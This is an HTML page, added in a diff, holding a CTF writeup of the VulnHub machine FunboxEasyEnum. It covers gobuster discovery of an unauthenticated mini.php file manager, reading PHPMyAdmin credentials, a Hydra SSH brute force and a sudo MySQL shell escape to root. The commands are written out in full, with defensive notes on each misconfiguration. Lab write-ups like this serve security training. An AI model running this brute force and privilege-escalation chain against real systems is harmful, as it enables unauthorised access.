@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html class="dark" lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+
+    <!-- ═══ SEO & Social Meta ═══ -->
+    <title>FunboxEasyEnum CTF Writeup — PHP File Manager &amp; MySQL Sudo Escape | Th0mas_sh316y</title>
+    <meta name="description" content="Full CTF writeup for FunboxEasyEnum on VulnHub. Covers web enumeration to discover an exposed PHP mini file manager, credential extraction from PHPMyAdmin config, Hydra SSH brute force as an alternative path, and MySQL sudo escape to gain root access."/>
+    <meta name="keywords" content="FunboxEasyEnum writeup, FunboxEasyEnum walkthrough, VulnHub CTF easy, PHP mini file manager exploit, PHPMyAdmin config credentials, MySQL GTFOBins, sudo privilege escalation, Hydra SSH brute force, ethical hacking CTF 2024, Th0mas_sh316y, VulnHub easy machine"/>
+    <meta name="author" content="Th0mas_sh316y"/>
+    <meta name="robots" content="index, follow"/>
+    <link rel="canonical" href="https://dorsiawave.dorsia74964.workers.dev/ctf/post-funboxenum.html"/>
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article"/>
+    <meta property="og:title" content="FunboxEasyEnum CTF Writeup — PHP File Manager &amp; MySQL Sudo Escape"/>
+    <meta property="og:description" content="VulnHub FunboxEasyEnum walkthrough: exposed mini.php file manager, PHPMyAdmin credential extraction, Hydra SSH brute force, and MySQL GTFOBins sudo escape to root."/>
+    <meta property="og:url" content="https://dorsiawave.dorsia74964.workers.dev/ctf/post-funboxenum.html"/>
+    <meta property="og:site_name" content="Th0mas_sh316y — Security Research"/>
+    <meta property="article:author" content="Th0mas_sh316y"/>
+    <meta property="article:tag" content="CTF, VulnHub, MySQL, GTFOBins, Privilege Escalation, PHP"/>
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="FunboxEasyEnum CTF Writeup — PHP File Manager &amp; MySQL Sudo Escape"/>
+    <meta name="twitter:description" content="Full walkthrough: mini.php file manager discovery, PHPMyAdmin config dump, Hydra SSH brute force, MySQL sudo GTFOBins → root."/>
+    <meta name="twitter:site" content="@Th0mas_sh316y"/>
+
+    <!-- JSON-LD Structured Data -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "TechArticle",
+      "headline": "FunboxEasyEnum CTF Writeup — PHP File Manager & MySQL Sudo Escape",
+      "description": "Step-by-step VulnHub FunboxEasyEnum walkthrough covering exposed PHP file manager, credential extraction, and MySQL GTFOBins privilege escalation.",
+      "author": { "@type": "Person", "name": "Th0mas_sh316y", "url": "https://dorsiawave.dorsia74964.workers.dev" },
+      "publisher": { "@type": "Organization", "name": "Th0mas_sh316y Security Research", "url": "https://dorsiawave.dorsia74964.workers.dev" },
+      "datePublished": "2026-04-23",
+      "keywords": "CTF, VulnHub, FunboxEasyEnum, MySQL, GTFOBins, Hydra, PHP file manager, privilege escalation"
+    }
+    </script>
+
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "outline": "#8d90a1","background": "#0a0a0a","surface-container-low": "#161616",
+                        "on-primary": "#ffffff","outline-variant": "#2a2a2a","on-surface": "#e2e2e2",
+                        "on-surface-variant": "#a0a0a0","primary-container": "#3366ff","surface": "#0a0a0a",
+                        "surface-container": "#121212","primary": "#3366ff","error": "#ffb4ab",
+                        "surface-variant": "#1a1a1a","surface-container-lowest": "#050505",
+                        "on-error": "#690005","on-background": "#e2e2e2"
+                    },
+                    "borderRadius": { "DEFAULT": "0px","lg": "0px","xl": "0px","full": "9999px" },
+                    "fontFamily": { "headline": ["Space Grotesk"],"body": ["Inter"],"label": ["Space Grotesk"] }
+                },
+            },
+        }
+    </script>
+    <style>
+        .material-symbols-outlined { font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #3366ff; }
+        body {
+            background-color: #0a0a0a;
+            background-image: radial-gradient(rgba(41,55,97,0.15) 1px, transparent 0),
+                radial-gradient(circle at 50% 50%, #1a1b26 0%, #0a0a0a 100%);
+            background-size: 32px 32px, 100% 100%;
+            background-attachment: fixed;
+        }
+        .bg-vignette { position:fixed;inset:0;pointer-events:none;background:radial-gradient(circle at 50% 50%,transparent 0%,rgba(10,10,10,0.8) 100%);z-index:-1; }
+        pre { overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        code { font-family: 'Courier New', monospace; }
+    </style>
+</head>
+<body class="text-on-surface font-body selection:bg-primary selection:text-on-primary min-h-screen">
+<div class="bg-vignette"></div>
+
+<!-- NAV -->
+<nav class="fixed top-0 w-full z-50 bg-background/80 backdrop-blur-md border-b border-outline-variant">
+    <div class="flex justify-between items-center w-full px-8 py-5 max-w-[1440px] mx-auto">
+        <a href="https://dorsiawave.dorsia74964.workers.dev" class="text-xl font-bold tracking-tighter text-primary font-headline">Th0mas_sh316y</a>
+        <div class="hidden md:flex items-center space-x-10">
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="index.html">Home</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="blog.html">Blog</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-primary" href="ctf.html">CTF Writeups</a>
+        </div>
+    </div>
+</nav>
+
+<main class="pt-24 pb-20 max-w-[1440px] mx-auto px-8 lg:px-12">
+
+    <!-- POST HEADER -->
+    <header class="mb-16">
+        <div class="flex items-center gap-4 mb-6">
+            <span class="bg-surface-variant text-primary text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-primary/30">CTF WRITEUP</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">VULNHUB</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">LINUX</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">EASY</span>
+        </div>
+        <h1 class="text-5xl md:text-7xl font-bold text-primary tracking-tight leading-none mb-8 font-headline">
+            FunboxEasyEnum — PHP Shell &amp; MySQL Root
+        </h1>
+        <div class="flex flex-col md:flex-row md:items-center gap-8 border-l-2 border-primary/40 pl-6">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-surface-container-low border border-outline-variant flex items-center justify-center">
+                    <span class="material-symbols-outlined text-primary" style="font-size:18px;">person</span>
+                </div>
+                <div>
+                    <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Written By</p>
+                    <p class="text-sm font-headline font-bold text-on-surface">Th0mas_sh316y</p>
+                </div>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider mb-1">Difficulty</p>
+                <div class="flex gap-1">
+                    <span class="w-2 h-2 bg-primary"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                </div>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Platform</p>
+                <p class="text-sm font-headline font-bold text-on-surface">VulnHub</p>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Technique</p>
+                <p class="text-sm font-mono font-bold text-primary">GTFOBins · MySQL Sudo</p>
+            </div>
+        </div>
+    </header>
+
+    <div class="grid grid-cols-1 lg:grid-cols-[1fr_280px] gap-16 items-start">
+
+        <article class="space-y-12">
+
+            <!-- INTRODUCTION -->
+            <section id="introduction">
+                <p class="text-xl font-body text-on-surface-variant leading-relaxed">
+                    FunboxEasyEnum is an Easy-difficulty VulnHub machine well suited to beginners who want to practice web enumeration, file manager exploitation, and sudo-based privilege escalation. The machine exposes an unsecured PHP file manager (<code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">mini.php</code>) on the web root, which enables arbitrary file reads. This leads either to direct credential recovery from a PHPMyAdmin configuration file or, alternatively, to SSH access via Hydra brute force. Either path eventually lands at a sudo MySQL entry that provides a clean GTFOBins shell escape to root.
+                </p>
+            </section>
+
+            <!-- SECTION 1: Reconnaissance -->
+            <section class="space-y-6" id="recon">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">01_Reconnaissance</h2>
+                <p class="text-on-surface-variant leading-relaxed">
+                    An Nmap scan identifies a standard Linux web server. The HTTP service on port 80 is the primary attack surface. Aggressive version detection and default script execution are used to gather as much information as possible in a single scan pass.
+                </p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / nmap</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo nmap -p22,80 &lt;TARGET_IP&gt; -sV -A -sC</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1
+80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)</pre>
+                </div>
+            </section>
+
+            <!-- SECTION 2: Web Enumeration -->
+            <section class="space-y-6" id="web-enum">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">02_Web_Enumeration — Discovering mini.php</h2>
+                <p class="text-on-surface-variant leading-relaxed">
+                    The default web root does not immediately present an obvious attack surface. Directory enumeration with a wordlist reveals several interesting paths, most notably <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">mini.php</code> — a single-file PHP file manager that is accessible without authentication.
+                </p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / directory brute force</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html</span>
+
+/index.php      (Status: 200)
+/mini.php       (Status: 200)  ← PHP file manager
+/phpmyadmin     (Status: 301)
+
+<span class="text-primary font-bold"># Confirm mini.php is accessible</span>
+$ curl http://&lt;TARGET_IP&gt;/mini.php</pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Security Risk — Unauthenticated File Managers</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed"><code class="text-primary">mini.php</code> is a popular single-file PHP file manager often used for quick server-side file browsing. Leaving it in a publicly accessible web root without authentication is a critical misconfiguration. It allows any visitor to browse the server's file system, read configuration files, upload shells, and execute commands — essentially granting full server access through a browser.</p>
+                </div>
+
+                <p class="text-on-surface-variant leading-relaxed">
+                    Through the <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">mini.php</code> interface, we can navigate the server file system. The PHPMyAdmin configuration file at <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/etc/phpmyadmin/config-db.php</code> contains database credentials in plaintext.
+                </p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / phpmyadmin config</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ cat /etc/phpmyadmin/config-db.php</span>
+
+&lt;?php
+$dbuser='phpmyadmin';
+$dbpass='[REDACTED]';
+$basepath='';
+$dbname='phpmyadmin';
+$dbserver='localhost';
+$dbport='3306';
+$dbtype='mysql'</pre>
+                </div>
+            </section>
+
+            <!-- SECTION 3: Alternative Path -->
+            <section class="space-y-6" id="alt-path">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">03_Alternative_Path — Hydra SSH Brute Force</h2>
+                <p class="text-on-surface-variant leading-relaxed">
+                    If web-based credential recovery is blocked or unavailable, SSH brute force against a recovered username list is a viable alternative. Enumerating usernames from system files (accessible via <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">mini.php</code> reading <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/etc/passwd</code>) provides a targeted list, significantly reducing brute force time.
+                </p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / hydra SSH</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ hydra -L usrn.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://&lt;TARGET_IP&gt;:22 -t 64 -I</span>
+
+[22][ssh] host: &lt;TARGET_IP&gt;   login: goat   password: [REDACTED]
+
+<span class="text-primary font-bold">$ ssh goat@&lt;TARGET_IP&gt;</span>
+Password: [REDACTED]
+
+goat@funbox3:~$ id
+uid=1001(goat) gid=1001(goat) groups=1001(goat)</pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Note — Two Paths, Same Destination</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed">Both paths — credential extraction via <code class="text-primary">mini.php</code> and Hydra SSH brute force — lead to the same privilege escalation vector. In real engagements, having multiple access paths is valuable for redundancy. The faster path here is always the config file extraction, as Hydra against a large wordlist can take significant time.</p>
+                </div>
+            </section>
+
+            <!-- SECTION 4: Privilege Escalation -->
+            <section class="space-y-6" id="privesc">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">04_PrivEsc — MySQL GTFOBins Sudo Escape</h2>
+                <p class="text-on-surface-variant leading-relaxed">
+                    Once on the box as any system user, <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">sudo -l</code> reveals a critical misconfiguration: the current user can run <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/usr/bin/mysql</code> as root without a password. MySQL's <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">-e</code> flag executes a SQL statement non-interactively. The <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">\! /bin/sh</code> syntax within MySQL spawns a system shell from within the database client — as root.
+                </p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / privilege escalation</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo -l</span>
+Matching Defaults entries:
+    env_reset, mail_badpass
+
+User goat may run the following commands:
+    (root) NOPASSWD: /usr/bin/mysql
+
+<span class="text-primary font-bold"># GTFOBins — MySQL shell escape</span>
+$ sudo -u root /usr/bin/mysql -e '\! /bin/sh'
+
+<span class="text-on-surface font-bold bg-primary/10 px-1"># id → uid=0(root)</span>
+
+# whoami
+root
+
+# cat /root/root.txt</pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Technique Note — MySQL GTFOBins</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed">The MySQL client supports a shell escape via the <code class="text-primary">\!</code> command, which passes the following string directly to the system shell. When MySQL is invoked with <code class="text-primary">sudo</code>, this shell runs as the sudo target (root). The <code class="text-primary">-e</code> flag allows this to be executed non-interactively in a single command without needing to enter the MySQL interactive prompt. This technique is documented at <strong class="text-on-surface">GTFOBins — mysql</strong>. Any database client with a shell escape command should be treated as a privilege escalation vector when accessible via sudo.</p>
+                </div>
+            </section>
+
+            <!-- Attack Chain Summary -->
+            <section class="space-y-4" id="summary">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">05_Attack_Chain_Summary</h2>
+                <div class="bg-surface-container-low border border-outline-variant p-8">
+                    <ol class="space-y-4 font-label text-xs uppercase tracking-widest text-on-surface-variant">
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">01</span> Nmap scan → ports 22 (SSH), 80 (HTTP) confirmed</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">02</span> Gobuster → mini.php discovered (unauthenticated PHP file manager)</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">03</span> Path A: mini.php → /etc/phpmyadmin/config-db.php → plaintext credentials</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">04</span> Path B: mini.php → /etc/passwd → username list → Hydra SSH → goat:[REDACTED]</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">05</span> SSH login as system user (goat or phpmyadmin)</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">06</span> sudo -l → (root) NOPASSWD: /usr/bin/mysql</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">07</span> sudo -u root /usr/bin/mysql -e '\! /bin/sh' → ROOT</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer class="pt-12 border-t border-outline-variant flex flex-col md:flex-row justify-between items-center gap-6">
+                <a href="ctf.html" class="flex items-center gap-2 text-xs font-label font-bold text-on-surface-variant uppercase hover:text-primary transition-colors">
+                    <span class="material-symbols-outlined" style="font-size:16px;">arrow_back</span> Back to CTF Lab
+                </a>
+                <div class="flex flex-wrap gap-2">
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#PHP_FILEMANAGER</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#MYSQL</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#GTFOBINS</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#HYDRA</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#SUDO_PRIVESC</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#WEB_ENUM</span>
+                </div>
+            </footer>
+        </article>
+
+        <!-- SIDEBAR -->
+        <aside class="sticky top-32 space-y-10 hidden lg:block">
+            <nav class="space-y-4">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em]">Table of Contents</h4>
+                <ul class="space-y-3 border-l border-outline-variant">
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-primary border-l-2 border-primary -ml-[1.5px]" href="#introduction">00_Introduction</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#recon">01_Reconnaissance</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#web-enum">02_Web_Enumeration</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#alt-path">03_Alternative_Path</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#privesc">04_PrivEsc_MySQL</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#summary">05_Attack_Chain</a></li>
+                </ul>
+            </nav>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-5">Machine Info</h4>
+                <div class="space-y-3">
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Machine</span><span class="text-xs font-headline font-bold text-on-surface">FunboxEasyEnum</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Platform</span><span class="text-xs font-headline font-bold text-on-surface">VulnHub</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">OS</span><span class="text-xs font-headline font-bold text-on-surface">Linux (Ubuntu 18.04)</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Difficulty</span><span class="text-xs font-headline font-bold text-on-surface/60">Easy</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Technique</span><span class="text-xs font-mono font-bold text-primary">MySQL GTFOBins</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Author</span><span class="text-xs font-headline font-bold text-on-surface">Th0mas_sh316y</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Status</span><span class="text-xs font-headline font-bold text-primary">Pwned ✓</span></div>
+                </div>
+            </div>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-4">Machine Download</h4>
+                <a href="https://www.vulnhub.com/entry/funbox-easyenum,550/" target="_blank"
+                   class="flex items-center gap-3 text-[10px] font-label font-bold text-primary uppercase tracking-widest border-b border-primary/30 pb-1 hover:border-primary hover:gap-4 transition-all">
+                    VulnHub Page <span class="material-symbols-outlined" style="font-size:14px;">open_in_new</span>
+                </a>
+            </div>
+        </aside>
+    </div>
+</main>
+
+<footer class="w-full py-16 bg-background/90 backdrop-blur-md border-t border-outline-variant mt-20">
+    <div class="flex flex-col md:flex-row justify-between items-center px-12 max-w-[1440px] mx-auto gap-10">
+        <div class="flex flex-col gap-2">
+            <a href="https://dorsiawave.dorsia74964.workers.dev" class="font-headline font-bold text-primary text-xl tracking-tighter hover:opacity-80 transition-opacity">Th0mas_sh316y</a>
+            <span class="font-label text-[10px] text-on-surface/40 uppercase tracking-[0.4em]">Security Engineer · Pentester · Red Team</span>
+        </div>
+        <div class="flex gap-12">
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://github.com/dorsia74964" target="_blank">GitHub</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://www.linkedin.com/in/dorisa74964" target="_blank">LinkedIn</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="#">Twitter</a>
+        </div>
+        <div class="font-label text-[11px] tracking-widest uppercase text-on-surface/30">© 2026 Th0mas_sh316y. ALL RIGHTS RESERVED.</div>
+    </div>
+</footer>
+</body>
+</html>
